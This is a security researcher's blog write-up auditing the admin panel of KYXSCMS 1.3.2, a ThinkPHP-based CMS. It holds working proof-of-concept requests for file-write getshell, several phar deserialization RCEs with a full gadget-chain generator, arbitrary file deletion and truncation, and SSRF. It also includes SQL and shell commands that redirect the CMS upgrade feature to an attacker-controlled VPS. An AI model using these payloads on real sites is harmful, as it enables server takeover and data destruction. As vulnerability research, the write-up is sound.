# KYXSCMS1.3.2审计与测试



再过一个多星期就要彻底进入期末了，将会迎来20多天的悲惨的期末复习时光，基本上算是只能一直取突击，学不辽安全了。所以最近学Java就学的很烦躁，基础知识看不下去了，那就来看一下CMS叭。想了一下，正好想起来Y4师傅时不时会发一些CMS的审计文章，所以我就跟着Y4师傅的文章来进行学习。选了这个`KYXSCMS的getshell`来进行复现，但是没想到复现之后自己审计，又审出了这么多新的东西。



## 任意文件写入的getshell（复现）

下载源码：

http://bbs.kyxscms.com/?t/1.html

扔到本地安装一下，一开始没直接看Y4师傅的文章，而是把这个CMS的东西大致看了一下，确实我自己粗略的瞅了一会没找到getshell的地方，感觉这个CMS到处都是数据库的操作，tp5.1.33也没SQL注入，而且感觉cnvd之前已经爆了很多洞了，所以基本上可能没啥洞可以审了。



getshell是在这个CMS后台的模板编辑这个功能点上，我也是挺菜的，之前测功能点的时候这里没找到更改按钮我就没细看，其实模板编辑确实是CMS容易getshell的一个功能点，我也需要慢慢的积累一下审计的经验，熟悉CMS容易getshell的功能点，对于提高审计的效率会很有帮助。



漏洞函数位于`application/admin/controller/Template.php`的`edit`方法：

```php
    public function edit(){
        $Template=model('template');
        $data=$this->request->post();
        if($this->request->isPost()){
            $res = $Template->edit($data);
```



post传参，跟进一下`$Template->edit`函数，是在`application/admin/model/Template.php`：

```php
    public function edit($data){
        return File::put($data['path'],$data['content']);
    }
```

继续跟进这个静态方法`put`，其实看到这里就可能有点感觉了能任意写了。

```php
    static public function put($filename,$content,$type=''){
        $dir   =  dirname($filename);
        if(!is_dir($dir))
            mkdir($dir,0755,true);
        if(false === file_put_contents($filename,$content)){
            throw new \think\Exception('文件写入错误:'.$filename);
        }else{
            self::$contents[$filename]=$content;
            return true;
        }
    }
```

相当于调用`file_put_contents($filename,$content)`。



POC：

```
http://www.kyxscms132.com/admin/template/edit

path=.feng.php&content=<?php phpinfo();?>
```

![pic9](D:\this_is_feng\github\CTF\Web\picture\pic9.png)



接下来开始自己挖掘这个CMS的漏洞。

## phar rce 1

其实之前一直在考虑，既然是thinkphp5.1.33，是不是可以利用phar反序列化。但是找文件操作函数没找到。这里的写文件其实没法phar，因为前面的mkdir过不去：

![pic10](D:\this_is_feng\github\CTF\Web\picture\pic10.png)

---------------------------------------------------------------------------------------------

不过第二天我还在看这个cms的时候突然又想到了这里，有些不甘心的又试了一下，主要就是这里：

```php
        $dir   =  dirname($filename);
        if(!is_dir($dir))
            mkdir($dir,0755,true);
        if(false === file_put_contents($filename,$content)){
```

比如我传`path=phar://./uploads/config/20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png&content=1`

，经过`dirname`得到的是`phar://./uploads/config/20210602/`，我突然想起来这个我可以绕的啊，我真是太菜了：

```php
path=phar://./uploads/config/20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png/123&content=1
```

在后面再加一层目录就行：

![pic15](D:\this_is_feng\github\CTF\Web\picture\pic15.png)

又一处phar反序列化。



---------------------------------------------------------------------------------------

## phar rce 2

非常的凑巧，我往下面看了一眼：

```php
        }else{
            $path=urldecode($this->request->param('path'));
            $info=$Template->file_info($path);
            $this->assign('path',$path);
            $this->assign('content',$info);
            $this->assign('meta_title','修改模版文件');
            return $this->fetch();
        }
```

这个`edit`方法如果不是post传还是get的话，跟进一下`file_info`函数，进入：

```php
    public function file_info($path){
        return File::read($path);
    }
```

再继续跟进`read`函数：

```php
    static public function read($filename,$type=''){
        return self::get($filename,'content',$type);
    }
```

继续跟进`get`函数：

```php
    static public function get($filename,$name,$type=''){
        if(!isset(self::$contents[$filename])){
            if(!is_file($filename)) return false;
           self::$contents[$filename]=file_get_contents($filename);
        }
        $content=self::$contents[$filename];
        $info   =   array(
            'mtime'     =>  filemtime($filename),
            'content'   =>  $content
        );
        return $info[$name];
    }
```

注意到第三行的`is_file($filename)`，`$filename`就是`$_GET['path']`，所以可以实现phar反序列化。

从网上找个thinkphp5.1.33的链子，生成一下phar：

```php
<?php
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = [$files];
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
    }

    trait Attribute
    {
        private $data;
        private $withAttr = ["lin" => "system"];

        public function get()
        {
            $this->data = ["lin" => "whoami"];
        }
    }
}

namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public function __construct()
        {
            $this->get();
        }
    }
}

namespace {

    $conver = new think\model\Pivot();
    $a = new think\process\pipes\Windows($conver);


    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->setMetadata($a); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
    $phar->stopBuffering();
}
?>
```

然后改后缀为png，然后在后台上传：

![pic11](D:\this_is_feng\github\CTF\Web\picture\pic11.png)

再phar反序列化即可：

```
http://xxxx/admin/template/edit?path=phar://./uploads/config/20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png
```

![pic12](D:\this_is_feng\github\CTF\Web\picture\pic12.png)



## 任意文件删除1

这个CMS的审计是在数据库内容可控的基础上的。这是因为后台有一个执行SQL语句的功能。

在这个基础上我进行审计的时候，发现了这么一个任意文件删除。不过准确来说不能准确的删除某一个文件，会把指定的目录及其子目录给删除。

漏洞位于`application/admin/controller/Template.php`的`del`方法：

```php
    public function del(){
        $id = array_unique((array)$this->request->param('id'));
        if ( empty($id) ) {
            $this->error('请选择要操作的数据!');
        }
        $Template=model('template');
        $res = $Template->del($id);
        if($res  !== false){
            $this->success('删除成功');
        } else {
            $this->error($Template->getError());
        }
    }
```

因为数据库可控，所以通过id查到的结果是可控的。跟进`$res = $Template->del($id);`：

```php
    public function del($id){
        $map = ['id' => $id];
        $name = Template::where($map)->column('name');
        foreach ($name as $value) {
            del_dir_file('./'.config('web.default_tpl').DIRECTORY_SEPARATOR.$value,true);
        }
```

查询出template表中id所对应的那一行的name列，然后作为`del_dir_file`函数的参数的最后一部分。

这个`del_dir_file`是用来删除目录或者文件的，因为第二个参数是true，所以只能删除目录。因此进行目录穿越，即可实现任意文件夹的删除。



尝试攻击一下。先在web根目录下创建一个目录1232。

然后先执行SQL：

```php
POST /admin/tool/sqlexecute.html

sql=insert into {pre}template values('3','../../1232/','2','1','2','2','0','2','0')
```

然后攻击，即可删除文件夹：

```php
http://xxxxxx/admin/template/del?id=3
```



本来刚准备把这个交CNVD的，结果瞅了一眼发现有个任意文件删除刚发出来，呜呜呜挖晚了被抢先了。



## SSRF

继续找还找了一个SSRF，其实感觉确实没啥用，交cnvd也被驳回了，而且类似这样的地方后台还有很多。

漏洞函数在`application/admin/controller/Market.php`的`template`函数：

```php
	public function template(){
        $url=config('web.official_url').'/market/index/4/'.Config::get('web.list_rows').'/'.$this->request->param('page');
        $data = Http::doGet($url,300);
        $data=json_decode($data,true);
        $paginator = new Bootstrap($data['data'],$data['per_page'],$data['current_page'],$data['total'],false,['path'=>url()]);
        $this->assign('list', $data['data']);
        $this->assign('page',$paginator->render());
        $this->assign('meta_title','模版列表');
        return $this->fetch();
    }
```

`$url`就是要请求的url，之后`Http::doGet($url,300);`进行get请求。不过这个`doGet`要求`$url`必须以`http`或者`https`开头，所以不能直接用gopher之类的协议进行SSRF。不过没关系，可以利用302跳转，在自己的VPS上写一个302跳转的服务，实现302跳转的SSRF。

再看一下`$url`是否可控。整个url是这个：

```php
config('web.official_url').'/market/index/4/'.Config::get('web.list_rows').'/'.$this->request->param('page')
```

可控的是最前面的`config('web.official_url')`和最后面的`$this->request->param('page')`，因为config是从数据库`ky_config`里得到的，而后台存在任意SQL语句执行，所以这个配置是我们可以随意更改的。

先改：

```
POST /admin/tool/sqlexecute.html

sql=update {pre}config set value  = 'http://118.31.168.198:39456' where id = 92
```



然后然后后台删除一下缓存文件：

![pic13](D:\this_is_feng\github\CTF\Web\picture\pic13.png)

可以尝试加上一行代码调试：

```
	public function template(){
        $url=config('web.official_url').'/market/index/4/'.Config::get('web.list_rows').'/'.$this->request->param('page');
        echo $url;
        exit();
```

可以看到`$url`可控：

![pic14](D:\this_is_feng\github\CTF\Web\picture\pic14.png)

因此存在SSRF漏洞。



## 任意文件清空

漏洞位于`application/admin/controller/Tool.php`的`sitemap_progress`方法。

```php
    public function sitemap_progress($page=1){
    	$content='';
    	$page_num=$this->request->param('page_num');
        $page_no=$this->request->param('page_no');
        $type=$this->request->param('type');
        $filename='sitemap';
        $map = ['status'=>1];
        $novel=Db::name('novel')->field('id,update_time')->where($map)->order('update_time desc')->limit($page_num);
        if($page_no){
        	$filename.='_'.$page;
        	$data=$novel->page($page);
        	$count=Db::name('novel')->where($map)->count('id');
        	$page_count=ceil($count/$page_num);
        }else{
        	$page_count=1;
        }
        $data=$novel->select();
        foreach ($data as $k=>$v){
			if($type=='xml'){
				$content.='<url>'.PHP_EOL.'<loc>'.url("home/novel/index",["id"=>$v["id"]],true,true).'</loc>'.PHP_EOL.'<mobile:mobile type="pc,mobile" />'.PHP_EOL.'<priority>0.8</priority>'.PHP_EOL.'<lastmod>'.time_format($v["update_time"],'Y-m-d').'</lastmod>'.PHP_EOL.'<changefreq>daily</changefreq>'.PHP_EOL.'</url>';
	        }else{
	        	$content.=url("home/novel/index",["id"=>$v["id"]],true,true).PHP_EOL;
	        }
		}
        if($type=='xml'){
        	$xml='<?xml version="1.0" encoding="UTF-8"?>'.PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:mobile="http://www.baidu.com/schemas/sitemap-mobile/1/">'.PHP_EOL;
			$xml.=$content.PHP_EOL.'</urlset>';
			$content=$xml;
        }
        $url=$this->request->domain().'/runtime/'.'repaste/'.$filename.'.'.$type;
        $filename=Env::get('runtime_path').'repaste'.DIRECTORY_SEPARATOR.$filename.'.'.$type;
        $content=File::put($filename,$content);
        if($page_count<=$page){
            return $this->success('生成完成',url('sitemap_progress',['page_no'=>$page_no,'page'=>$page,'page_num'=>$page_num,'type'=>$type,]),['complete'=>true,'page_count'=>$page_count,'page'=>$page,'filename'=>$url]);
        }else{
            return $this->success('生成进度',url('sitemap_progress',['page_no'=>$page_no,'page'=>$page+1,'page_num'=>$page_num,'type'=>$type,]),['complete'=>false,'page_count'=>$page_count,'page'=>$page+1,'filename'=>$url]);
        }
    }
```



重点只关注这几行代码：

```php
        $type=$this->request->param('type');
......
 $filename=Env::get('runtime_path').'repaste'.DIRECTORY_SEPARATOR.$filename.'.'.$type;
........
$content=File::put($filename,$content);
```

`File::put`方法很熟悉了，最终的结果就是这个：

```php
file_put_contents($filename,$content)
```

但是之所以只关注这几行代码，是经过审计，发现如果想要`filename`可控，但是`$content`不可控，唯一可控就是控制`$content`为空。

`$content`来自与`ky_novel`表中`status`为1的id值，可以利用后台执行SQL文件的功能来实现没有`status`为1的值，这样`$content`为空。

这样执行相当于：

```php
file_put_contents($filename,"");//可控的$filename
```

因此存在任意文件清空的漏洞。对于`$filename`，前面的部位不可控，最后面可控，因此可以目录穿越来任意文件清空。

在web根目录新建一个feng.php：

```php
<?php
$feng="feng";
```

进行数据库的处理：

```php
POST /admin/tool/sqlexecute.html

sql= update {pre}novel set status = 0
```



然后进行清空：

```
http://xxxxxx/admin/tool/sitemap_progress

type=/../../../feng.php
```



即可成功清空文件，实现任意文件清空。



## 新的任意文件写入

还是继续对admin模块下的功能代码一个一个看，本来想着应该拿不到shell了，结果运气不错又找到了一个新的getshell，又一个可以任意文件写的点，真是太爽了。感觉这个shell比phar的那个shell质量要高一点。



漏洞位于`application/admin/controller/Upgrade.php`的`update`方法：

```php
    public function update(){
        $Upgrade=model('upgrade');
        if(false !== $up_return=$Upgrade->updates()){
            return json(['code'=>1,'number'=>$up_return],200);
        }else{
            return json(['code'=>0,'error'=>$Upgrade->getError()],200);
        }
    }
```

跟进`$Upgrade->updates()`方法：

```php
    public function updates(){
        $num=Request::get('num',0);
        $upArray=$this->upContent();
        $upCode=Http::doGet(Config::get('web.official_url').'/'.$upArray[$num]['file_name']);
        if(!$upCode){
            $this->error="读取远程升级文件错误，请检测网络！";
            return false;
        }
        $dir = dirname($upArray[$num]['stored_file_name']);
        if(!is_dir($dir))
            mkdir($dir,0755,true);
         if(false === @file_put_contents($upArray[$num]['stored_file_name'],$upCode)){
            $this->error="保存文件错误，请检测文件夹写入权限！";
            return false;
         }
        return $num+1;
    }
```

先看一下`$this->upContent();`：

```php
    public function upContent($id=null,$type=null,$model='updata'){
        $content=Cache::get('update_list');
        if(!$content){
            $url = Config::get('web.official_url').'/upgrade/'.$model.'/'.$id;
            if($type){
                $url = $url.'/'.$type;
            }
            $content=Http::doGet($url,30,$this->oauth_access_token);
            $content=json_decode($content,true);
            Cache::set('update_list',$content);
        }
        return $content;
    }
```

先判断缓存中有没有，没有的话就去请求这个`$url`。默认缓存中肯定是没有的。

很关键的地方就在于`$url`的前面`Config::get('web.official_url')`，这个是从数据库中得到的，而后台存在执行任意SQL语句的功能，因此这个`$url`是我们可控的，可以控制为我们自己的VPS。

然后get请求，得到数据，然后`json_decode`转换成变量，因此这个变量是可控的。

从`upContent`函数出来，继续看一下`updates`函数：

```php
        $upCode=Http::doGet(Config::get('web.official_url').'/'.$upArray[$num]['file_name']);
        if(!$upCode){
            $this->error="读取远程升级文件错误，请检测网络！";
            return false;
        }
        $dir = dirname($upArray[$num]['stored_file_name']);
        if(!is_dir($dir))
            mkdir($dir,0755,true);
         if(false === @file_put_contents($upArray[$num]['stored_file_name'],$upCode)){
            $this->error="保存文件错误，请检测文件夹写入权限！";
            return false;
         }
```

利用点就是:

```php
         if(false === @file_put_contents($upArray[$num]['stored_file_name'],$upCode)){
```

因此`$upArray`是我们可控的，因此写入的文件名是可控的。再看一下`$upCode`：

```php
$upCode=Http::doGet(Config::get('web.official_url').'/'.$upArray[$num]['file_name']);
```

同样是从一个可控的url里得到内容，因此写入的文件名和内容都完全可控，存在一个任意文件写入的漏洞，实现getshell。



具体的攻击：

首先我执行SQL语句，让`Config::get('web.official_url')`可控：

```php
POST /admin/tool/sqlexecute.html

sql=update {pre}config set value  = 'http://118.31.168.198:39601' where id = 92
```



接着在自己的VPS上面写一下，我这里是在39601端口：

```shell
mkdir upgrade
cd upgrade
mkdir updata
cd upgrade
echo '{"0":{"file_name":"1.txt","stored_file_name":".feng.php"}}' > index.php
cd ../
cd ../
echo "<?php phpinfo();?>" > 1.txt
```

然后访问：

```
http://xxxxxxxx/admin/upgrade/update
```

即可成功写入：

![pic16](D:\this_is_feng\github\CTF\Web\picture\pic16.png)

### 



## phar rce3

当然这里同样可以phar反序列化，攻击方式和之前相同的，不多提了:

![pic17](D:\this_is_feng\github\CTF\Web\picture\pic17.png)



## phar rce 4

漏洞位于`application/admin/controller/Upgrade.php`的`install`函数：

```php
    public function install($model=null){
        $Upgrade=model('upgrade');
        if($model=='insert'){
            $return=$Upgrade->insert_install($this->request->param('id'));
        }else{
            $return=$Upgrade->install();
        }
        if($return==true){
            return $this->success('安装完成！','');
        }else{
            $this->error($Upgrade->getError(),'');
        }
    }
```

如果传`?model=insert`，就会进行`insert_install`：

```php
    //插件安装
    public function insert_install($id){
        $url = Config::get('web.official_url').'/upgrade/info/'.$id;
        $Content=Http::doGet($url,30,$this->oauth_access_token);
        $info=json_decode($Content,true);
        if(!empty($info['error'])){
            $this->error=$info['error'];
           return false;
        }
        $upArray=$this->upContent();
        if($this->install_file($upArray)==false){
            return false;
        }
```

前面的代码经过调试，不用管，直接看这里：

```php
        $upArray=$this->upContent();
        if($this->install_file($upArray)==false){
            return false;
        }
```

`$upArray`是可控的。然后进入`install_file`：

```php
    private function install_file($list_array){
        foreach ($list_array as $value) {
            if($value['suffix']==='del' || $value['suffix']==='sql'){
                $upCode=file_get_contents($value['stored_file_name']);
```

`$value['stored_file_name']`可控，因此存在phar反序列化。

把上面的那个改一下其实就差不多了：

```php
mkdir upgrade
cd upgrade
mkdir updata
cd upgrade
echo '{"0":{"suffix":"del","stored_file_name":"phar://./uploads/config/20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png"}}' > index.php
cd ../
cd ../
echo "<?php phpinfo();?>" > 1.txt
```

![pic17](D:\this_is_feng\github\CTF\Web\picture\pic18.png)



## phar rce 5

之前感觉这个CMS没有phar，还是我看的太不仔细了，真的仔细的审计就会发现还有phar。

接着phar rce 4的最后，继续往下看：

```php
    private function install_file($list_array){
        foreach ($list_array as $value) {
            if($value['suffix']==='del' || $value['suffix']==='sql'){
                $upCode=file_get_contents($value['stored_file_name']);
                $upCode = str_replace("\r", "\n", $upCode);
                $filePath=explode("\n",$upCode);
                foreach ($filePath as $v){
                    $v = trim($v);
                    if(empty($v)) continue;
                    if($value['suffix']==='del'){
                        @unlink($v);
```

再往下看，可以发现下面还有一个`unlink`函数，这个函数给我的反应是：又多了一个phar rce和一个任意文件删除。

仔细看一下，`$upCode`是我们可控的，然后再进行一些处理，进入foreach，然后直接`unlink`，非常简单的利用。

```shell
root@fab5a704a013:/var/www/html/upgrade/updata# echo '{"0":{"suffix":"del","stored_file_name":"http://118.31.168.198:39601/2.txt"}}' > index.php
root@fab5a704a013:/var/www/html/upgrade/updata# cd /var/www/html
root@fab5a704a013:/var/www/html# echo "phar://./uploads/config/20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png" > 2.txt
```



![pic19](D:\this_is_feng\github\CTF\Web\picture\pic19.png)



## 任意文件删除2

没啥好说的，利用phar rce 5，实现任意文件删除即可。就不具体写了。

​	

## 任意文件删除3

还是这个函数：

```php
    private function install_file($list_array){
        foreach ($list_array as $value) {
            if($value['suffix']==='del' || $value['suffix']==='sql'){
                $upCode=file_get_contents($value['stored_file_name']);
                $upCode = str_replace("\r", "\n", $upCode);
                $filePath=explode("\n",$upCode);
                foreach ($filePath as $v){
                    $v = trim($v);
                    if(empty($v)) continue;
                    if($value['suffix']==='del'){
                        @unlink($v);
                    }elseif ($value['suffix']==='sql') {
                        $prefix=Config::get('database.prefix');
                        $upSqlCode = str_replace("`ky_", "`{$prefix}", $v);
                        try{
                            Db::execute($upSqlCode);
                        }catch(\Exception $e){
                            $this->error='执行sql错误代码：'.$e->getMessage();
                            return false;
                        }
                    }
                }
                @unlink($value['stored_file_name']);
            }
        }
        return true;
    }
```

最下面的`@unlink($value['stored_file_name']);`没啥好说的。。。这个函数写的安全性很差。

而且同样的，进入`else`同样的存在以上的那些问题：

```php
        if($model=='insert'){
            $return=$Upgrade->insert_install($this->request->param('id'));
        }else{
            $return=$Upgrade->install();
        }
```





## phar rce 6

漏洞位于`application/admin/controller/Upload.php`的`sublevel_upload`方法：

```php
        if($this->request->isPost()){
            if($this->request->post('status') == 'chunkCheck'){
                return $this->chunkCheck();
```

跟进`$this->chunkCheck()`：

```php
    protected function chunkCheck(){
        $upload_path = config('web.upload_path');
        $target =  $upload_path.$this->request->param('path').'/'.$this->request->post('name').'/'.$this->request->post('chunkIndex');
        if(file_exists($target) && filesize($target) == $_POST['size']){
            return json(['ifExist'=>1]);
        }
        return json(['ifExist'=>0]);
    }
```

可以发现`file_exists($target)`，看一下`$target`的组成：

```php
$upload_path = config('web.upload_path');
$target =  $upload_path.$this->request->param('path').'/'.$this->request->post('name').'/'.$this->request->post('chunkIndex');
```

还是老姿势了，`$upload_path`是从缓存或者数据库中读到的，后台清一下缓存，然后用一下SQL执行的功能就可以控制。后面拼接的也都是可控的，因此可以phar反序列化。



攻击：

先改一下`upload_path`：

```php
POST /admin/tool/sqlexecute.html
    
sql=update {pre}config set value  = 'phar://' where id = 88
```

然后直接phar打：

```php
http://www.kyxscms132.com/admin/upload/sublevel_upload

status=chunkCheck&path=./uploads/config/&name=20210602&chunkIndex=20a9e2a63d2a1e5d42094af2ec61e42e.png
```

![pic20](D:\this_is_feng\github\CTF\Web\picture\pic20.png)



## phar rce 7

漏洞位于`application/admin/controller/Upload.php`的`sublevel_upload`方法：

```php
    public function sublevel_upload(){
        if($this->request->isPost()){
            if($this->request->post('status') == 'chunkCheck'){
                return $this->chunkCheck();
            }elseif($this->request->post('status') == 'chunksMerge'){
                if($this->request->post('name')){
                    if($file = $this->chunksMerge($this->request->post('name'),$this->request->post('chunks'),$this->request->post('ext'),$this->request->post('md5'))){
                        $file['code']=1;
                        return json($file);
                    }
                }
                return json(['code'=>0]);
```

上一个phar是进入`status == chunkCheck`的，这次的是进入`chunksMerge`：

```php
    protected function chunksMerge($name, $chunks, $ext, $md5){
        $upload_path = config('web.upload_path');
        $targetDir = $upload_path.$this->request->param('path').'/'.$name;
        //检查对应文件夹中的分块文件数量是否和总数保持一致
        if($chunks >= 1 && (count(scandir($targetDir)) - 2) == $chunks){
```

看到一个`scandir`函数，可以`phar`反序列化。看一下`$targetDir`是否可控。`$upload_path`可以来自数据库中，可控。剩余分部分来自post或者get传参，也都可控，因此可以phar反序列化。



攻击：

```php
POST /admin/tool/sqlexecute.html
    
sql=update {pre}config set value  = 'phar://' where id = 88
```

然后清缓存：

![pic13](D:\this_is_feng\github\CTF\Web\picture\pic13.png)

然后phar开打：

```php
http://www.kyxscms132.com/admin/upload/sublevel_upload

status=chunksMerge&path=./uploads/config/&name=20210602/20a9e2a63d2a1e5d42094af2ec61e42e.png&chunks=1
```

![pic21](D:\this_is_feng\github\CTF\Web\picture\pic21.png)







## 总结

至此也算是把这个CMS的后台代码都大致看了一眼，收获了很多，我觉得基本上phar都被我挖完了，可能还剩下1-2个我没发现。还有的话就是可能还有几个任意文件删除，可能我当时看着不能控phar就没细往下看了。有一说一，phar确实yyds，不过这个CMS能这么多phar，主要的原因还是后台给了一个执行SQL语句的功能，我觉得如果把这个功能给删掉，这个后台的安全性直接提升80%以上。

而且，审漏洞更多的还是去找功能，有些功能它真的除非开发nt才能利用，而有的功能可能开发正常写都能被利用，所以我觉得还是审计以看功能为主，当然视野也是很正常的。

期末加油叭，CMS的审计应该告一段落了，暑假再重新开始了。

感谢Y4师傅的指导。
